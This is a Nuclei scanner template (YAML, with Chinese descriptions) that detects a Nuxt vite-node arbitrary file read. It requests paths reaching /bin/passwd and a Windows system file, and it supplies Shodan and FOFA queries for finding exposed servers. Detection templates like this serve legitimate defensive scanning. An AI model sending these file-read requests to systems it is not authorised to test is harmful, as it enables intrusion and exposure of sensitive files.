id: nuxt-js-semi-lfi

info:
  name: Semi - 任意文件读取漏洞
  author: DhiyaneshDK
  severity: medium
  description: |
    该模板用于检测 Semi - 任意文件读取漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/__nuxt_vite_node__/module//bin/passwd`、`/__nuxt_vite_node__/module/C:/Windows/System32/calc.exe` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://huntr.dev/bounties/7840cd32-af15-40cb-a148-7ef3dff4a0c2/
    - https://bryces.io/blog/nuxt3
    - https://twitter.com/fofabot/status/1669339995780558849
  classification:
    cpe: cpe:2.3:a:nuxt:framework:*:*:*:*:*:*:*:*
    cwe-id: CWE-22,CWE-73
  metadata:
    verified: "true"
    max-request: 2
    vendor: nuxt
    product: framework
    shodan-query: html:"buildAssetsDir" "nuxt"
    fofa-query: body="buildAssetsDir" && body="__nuxt"
  tags: huntr,lfi,nuxtjs,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/__nuxt_vite_node__/module//bin/passwd"
      - "{{BaseURL}}/__nuxt_vite_node__/module/C:/Windows/System32/calc.exe"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"plugin":'
          - '"pluginCode":'
          - '"id":'
        condition: and

      - type: word
        part: header
        words:
          - "application/json"
